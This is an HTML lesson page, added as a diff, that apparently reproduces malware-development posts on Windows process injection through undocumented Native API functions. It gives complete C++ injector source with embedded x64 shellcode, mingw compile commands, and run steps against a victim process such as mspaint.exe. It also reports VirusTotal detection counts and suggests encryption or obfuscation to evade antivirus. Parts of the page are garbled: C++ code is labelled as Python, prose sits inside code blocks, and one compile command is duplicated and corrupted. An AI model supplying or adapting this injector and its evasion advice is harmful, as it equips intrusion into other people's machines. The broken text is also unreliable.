@@ -1,0 +1,647 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Code injection via undocumented Native API functions. Simple</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #11</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Code injection via undocumented Native API functions. Simple</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the previous sections I wrote about DLL injection via undocumented <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtCreateThreadEx</code> and <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtAllocateVirtualMemory</code>. The following post is a result of self-research of malware development technique which is interaction with the undocumented Native API. Today I tried to replace another function <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">OpenProcess</code> with undocumented Native API function NtOpenProcess. First of all, let’s take a look at function NtOpenProcess syntax: __kernel_entry NTSYSCALLAPI NTSTATUS NtOpenProcess( [out] PHANDLE ProcessHandle, [in] ACCESS_MASK DesiredAccess, [in] POBJECT_ATTRIBUTES ObjectAttributes, [in, optional] PCLIENT_ID ClientId ); Here it is worth paying attention to the ObjectAttributes and ClientId parameters. ObjectAttributes - a pointer to an OBJECT_ATTRIBUTES structure that specifies the attributes to apply to the process object handle. This has to be defined and initialized prior to opening the handle. ClientId - a pointer to a client ID that identifies the thread whose process is to be opened. In order to use NtOpenProcess function, we have to define its definition in our code:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Similarly, OBJECT_ATTRIBUTES and PCLIENT_ID need to be defined. These structures are defined under NT Kernel header files. We can run WinDBG in local kernel mode and run: dt nt!_OBJECT_ATTRIBUTES</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then run: dt nt!_CLIENT_ID</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and: dt nt!_UNICODE_STRING</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">There is one more caveat. Before returning the handle by the NtOpenProcess function/ routine, the Object Attributes need to be initialized which can be applied to the handle. To initialize the Object Attributes an IntitializeObjectAttributes macro is defined and invoked which specifies the properties of an object handle to routines that open handles.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">IntitializeObjectAttributes Then, loading the ntdll.dll library to invoke NtOpenProcess:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And then get starting addresses of the our functions:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And finally open process:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And otherwise the main logic is the same.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As shown in this code, the Windows API call <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">OpenProcess</code> can be replaced with Native API call function NtOpenProcess. But we need to define the structures which are</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">defined in the NT kernel header files. The downside to this method is that the function is undocumented so it may change in the future. Let’s go to see our simple malware in action. Compile hack.cpp: x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, run process hacker 2:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For example, the highlighted process mspaint.exe is our victim. Let’s run our simple malware:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">.\hack.exe 4964</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see our meow-meow messagebox is popped-up. Let’s go to investigate properties of our victim process PID: 4964:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, our meow-meow payload successfully injected as expected! As you can see the main logic is the same with previous NT API function call techniques but there is a caveat with defining the structures and associated parameters. Without defining this structures the code will not run. The reason why it’s good to have this technique in your arsenal is because we are not</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">using <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">OpenProcess</code> which is more popular and suspicious and which is more closely investigated by the blue teamers. Let’s go to upload our new hack.exe with encrypted command to Virustotal (13.12.2021):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/9f4213643891fc14473948deb15077d9b7b4d2 da3db467932e57e7e383e535e6?nocache=1 So, 5 of 65 AV engines detect our file as malicious. If we want, for better result, we can add payload encryption with key or obfuscate functions, or combine both of this techniques. I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. WinDBG kernel debugging <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> NtOpenProcess <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtAllocateVirtualMemory</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code> source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">24. code injection via memory sections. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the previous sections I wrote about classic injections where WinAPI functions replaced with Native API functions. The following section is a result of self-research of another malware development technique. Although the use of these trick in a regular application is an indication of something malicious, threat actors will continue to use them for process injection.</p>
+
+            <div id="what-is-section" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>What is section?</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Section is a memory block that is shared between processes and can be created with <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtCreateSection</code> API. practical example. The flow is this technique is: <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtCreateSection</code>:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">firstly, we create a new section object via</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, before a process can read/write to that block of memory, it has to map a view of the said section, which can be done with <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtMapViewOfSection</code>:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Map a view of the created section to the local malicious process with RW protection:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, map a view of the created section to the remote target process with RX protection:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see for opening process I used Native API NtOpenProcess function:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, write our payload:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">unsigned char my_payload[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+
+Then, create a remote thread in the target process and point it to the mapped view in
+
+the target process to trigger the shellcode via RtlCreateUserThread:
+
+Finally, I used ZwUnmapViewOfSection for clean up:</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So full code which demonstrates this technique is:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+
+* hack.cpp
+* advanced code injection technique via
+* NtCreateSection and NtMapViewOfSection
+* author @cocomelonc
+* https://cocomelonc.github.com/tutorial/
+2021/12/13/malware-injection-12.html
+*/
+#include &lt;iostream&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#pragma comment(lib, "ntdll")
+#pragma comment(lib, "advapi32.lib")
+#define InitializeObjectAttributes(p,n,a,r,s) { \
+(p)-&gt;Length = sizeof(OBJECT_ATTRIBUTES); \
+(p)-&gt;RootDirectory = (r); \
+(p)-&gt;Attributes = (a); \
+(p)-&gt;ObjectName = (n); \
+(p)-&gt;SecurityDescriptor = (s); \
+(p)-&gt;SecurityQualityOfService = NULL; \
+}
+// dt nt!_UNICODE_STRING
+typedef struct _LSA_UNICODE_STRING {
+USHORT
+Length;
+USHORT
+MaximumLength;
+PWSTR
+Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+// dt nt!_OBJECT_ATTRIBUTES
+typedef struct _OBJECT_ATTRIBUTES {
+ULONG
+Length;
+HANDLE
+RootDirectory;
+PUNICODE_STRING ObjectName;
+ULONG
+Attributes;
+PVOID
+SecurityDescriptor;
+PVOID
+SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+// dt nt!_CLIENT_ID
+typedef struct _CLIENT_ID {
+PVOID
+UniqueProcess;
+PVOID
+UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+// NtCreateSection syntax
+typedef NTSTATUS(NTAPI* pNtCreateSection)(
+OUT PHANDLE
+SectionHandle,
+IN ULONG
+DesiredAccess,
+IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+IN PLARGE_INTEGER
+MaximumSize OPTIONAL,
+IN ULONG
+PageAttributess,
+IN ULONG
+SectionAttributes,
+IN HANDLE
+FileHandle OPTIONAL
+);
+// NtMapViewOfSection syntax
+typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
+HANDLE
+SectionHandle,
+HANDLE
+ProcessHandle,
+PVOID*
+BaseAddress,
+ULONG_PTR
+ZeroBits,
+SIZE_T
+CommitSize,
+PLARGE_INTEGER
+SectionOffset,
+PSIZE_T
+ViewSize,
+DWORD
+InheritDisposition,
+ULONG
+AllocationType,
+ULONG
+Win32Protect
+);
+// RtlCreateUserThread syntax
+typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
+ProcessHandle,
+IN HANDLE
+IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
+IN BOOLEAN
+CreateSuspended,
+IN ULONG
+StackZeroBits,
+IN OUT PULONG
+StackReserved,
+IN OUT PULONG
+StackCommit,
+StartAddress,
+IN PVOID
+IN PVOID
+StartParameter OPTIONAL,
+OUT PHANDLE
+ThreadHandle,
+OUT PCLIENT_ID
+ClientID
+);
+// NtOpenProcess syntax
+typedef NTSTATUS(NTAPI* pNtOpenProcess)(
+PHANDLE
+ProcessHandle,
+ACCESS_MASK
+AccessMask,
+POBJECT_ATTRIBUTES
+ObjectAttributes,
+
+PCLIENT_ID
+
+ClientID
+
+);
+// ZwUnmapViewOfSection syntax
+typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
+HANDLE
+ProcessHandle,
+PVOID BaseAddress
+);
+// get process PID
+int findMyProc(const char *procname) {
+HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+int main(int argc, char* argv[]) {
+// 64-bit meow-meow messagebox without encryption
+unsigned char my_payload[] =
+
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+SIZE_T s = 4096;
+LARGE_INTEGER sectionS = { s };
+HANDLE sh = NULL; // section handle
+PVOID lb = NULL; // local buffer
+PVOID rb = NULL; // remote buffer
+HANDLE th = NULL; // thread handle
+DWORD pid; // process ID
+pid = findMyProc(argv[1]);
+OBJECT_ATTRIBUTES oa;
+CLIENT_ID cid;
+InitializeObjectAttributes(&amp;oa, NULL, 0, NULL, NULL);
+cid.UniqueProcess = (PVOID) pid;
+cid.UniqueThread = 0;
+// loading ntdll.dll
+HANDLE ntdll = GetModuleHandleA("ntdll");
+pNtOpenProcess myNtOpenProcess =
+(pNtOpenProcess)GetProcAddress(
+ntdll, "NtOpenProcess");
+
+pNtCreateSection myNtCreateSection =
+(pNtCreateSection)(GetProcAddress(
+ntdll, "NtCreateSection"));
+pNtMapViewOfSection myNtMapViewOfSection =
+(pNtMapViewOfSection)(GetProcAddress(
+ntdll, "NtMapViewOfSection"));
+pRtlCreateUserThread myRtlCreateUserThread =
+(pRtlCreateUserThread)(GetProcAddress(
+ntdll, "RtlCreateUserThread"));
+pZwUnmapViewOfSection myZwUnmapViewOfSection =
+(pZwUnmapViewOfSection)(GetProcAddress(
+ntdll, "ZwUnmapViewOfSection"));
+// create a memory section
+myNtCreateSection(&amp;sh,
+SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
+NULL, (PLARGE_INTEGER)&amp;sectionS,
+PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+// bind the object in the memory
+// of our process for reading and writing
+myNtMapViewOfSection(sh, GetCurrentProcess(),
+&amp;lb, NULL, NULL, NULL,
+&amp;s, 2, NULL, PAGE_READWRITE);
+// open remote proces via NT API
+HANDLE ph = NULL;
+myNtOpenProcess(&amp;ph, PROCESS_ALL_ACCESS, &amp;oa, &amp;cid);
+if (!ph) {
+printf("failed to open process :(\n");
+return -2;
+}
+// bind the object in the memory of the target process
+// for reading and executing
+myNtMapViewOfSection(sh, ph, &amp;rb, NULL, NULL, NULL,
+&amp;s, 2, NULL, PAGE_EXECUTE_READ);
+// write payload
+memcpy(lb, my_payload, sizeof(my_payload));
+// create a thread
+myRtlCreateUserThread(ph, NULL, FALSE,
+0, 0, 0, rb, NULL, &amp;th, NULL);
+
+// and wait
+if (WaitForSingleObject(th, INFINITE) == WAIT_FAILED) {
+return -2;
+}
+// clean up
+myZwUnmapViewOfSection(GetCurrentProcess(), lb);
+myZwUnmapViewOfSection(ph, rb);
+CloseHandle(sh);
+CloseHandle(ph);
+return 0;
+}
+As you can see, everything is simple. Also I used findMyProc function from one of my
+previous sections:
+
+Changes to the local view of the section will also cause remote views to be modified as
+well, thus bypassing the need for APIs such as KERNEL32.DLL!WriteProcessMemory
+to write malicious code into remote process address space.
+Although this is somewhat of an advantage over direct virtual memory allocation using
+NtAllocateVirtualMemory, it creates similar malicious memory artifacts that blue
+teamers should look out for:
+
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So finally after we understood entire code of the malware, we can test it. Let’s go to compile our malware: x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptionsections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-igc-plibgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, see everything in action! Start our victim process (in our case mspaint.exe) on the victim machine (Windows 10 x64):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then run our malware: .\hack.exe mspaint.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We can see that everything was completed perfectly :) Let’s go to upload our malware to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/1573a7d59de744b0723e83539ad8dcb9347c89f2 7a8321ea578c8c0d98f1e2cb?nocache=1 So, 4 of 62 AV engines detect our file as malicious. If we want, for better result, we can add payload encryption with key or obfuscate functions, or combine both of this techniques. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. BlackHat USA 2019 Process Injection Techniques - Gotta Catch Them All</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">WinDBG kernel debugging NtOpenProcess <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtCreateSection</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtMapViewOfSection</code> ZwUnmapViewOfSection Moneta64.exe source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">25. code injection via ZwCreateSection. Simple C++ malware example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the previous section I wrote about code injection via memory sections. This section is a result of self-research of replacing some Nt prefixes with Zw prefixes. Zw prefix? The Nt prefix is an abbreviation of Windows NT, but the Zw prefix has no meaning. From the MSDN: When a user-mode application calls the Nt or Zw version of a native system services routine, the routine always treats the parameters that it receives as values that come from a user-mode source that is not trusted. The routine thoroughly validates the parameter values before it uses the parameters. In particular, the routine probes any caller-supplied buffers to verify that the buffers are located in valid user-mode memory and are aligned properly. practical example. C++ malware. Let’s go to replace some of the NT API functions from the previous post example with Zw-prefixed functions. The first thing that has to be done is to create a legit process with CreateProcessA: BOOL CreateProcessA( [in, optional] LPCSTR lpApplicationName, [in, out, optional] LPSTR lpCommandLine, [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] BOOL bInheritHandles,</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">[in] [in, optional] [in, optional] [in] [out]</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">DWORD dwCreationFlags,</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">LPVOID
+lpEnvironment,
+LPCSTR
+lpCurrentDirectory,
+LPSTARTUPINFOA
+lpStartupInfo,
+LPPROCESS_INFORMATION lpProcessInformation
+
+);
+
+Next steps are similar as previous post but, the only difference is we use
+ZwCreateThreadEx:
+typedef NTSTATUS(NTAPI* pZwCreateThreadEx)(
+_Out_ PHANDLE
+ThreadHandle,
+_In_ ACCESS_MASK
+DesiredAccess,
+_In_opt_ POBJECT_ATTRIBUTES
+ObjectAttributes,
+_In_ HANDLE
+ProcessHandle,
+_In_ PVOID
+StartRoutine,
+_In_opt_ PVOID
+Argument,
+_In_ ULONG
+CreateFlags,
+_In_opt_ ULONG_PTR
+ZeroBits,
+_In_opt_ SIZE_T
+StackSize,
+_In_opt_ SIZE_T
+MaximumStackSize,
+_In_opt_ PVOID
+AttributeList
+);
+
+instead of RtlCreateUserThread for triggering payload.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And another difference is we used ZwClose for close handles (clean up):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">typedef NTSTATUS(NTAPI* pZwClose)(
+_In_ HANDLE
+Handle
+);
+
+So, the full source code of our example malware is:
+/*
+* hack.cpp - code injection via
+* ZwCreateSection, ZwUnmapViewOfSection
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/01/14/malware-injection-13.html
+*/
+#include &lt;cstdio&gt;
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+#pragma comment(lib, "ntdll")
+// ZwCreateSection
+typedef NTSTATUS(NTAPI* pZwCreateSection)(
+OUT PHANDLE
+SectionHandle,
+IN ULONG
+DesiredAccess,
+IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+IN PLARGE_INTEGER
+MaximumSize OPTIONAL,
+IN ULONG
+PageAttributess,
+IN ULONG
+SectionAttributes,
+IN HANDLE
+FileHandle OPTIONAL
+);
+// NtMapViewOfSection syntax
+typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
+HANDLE
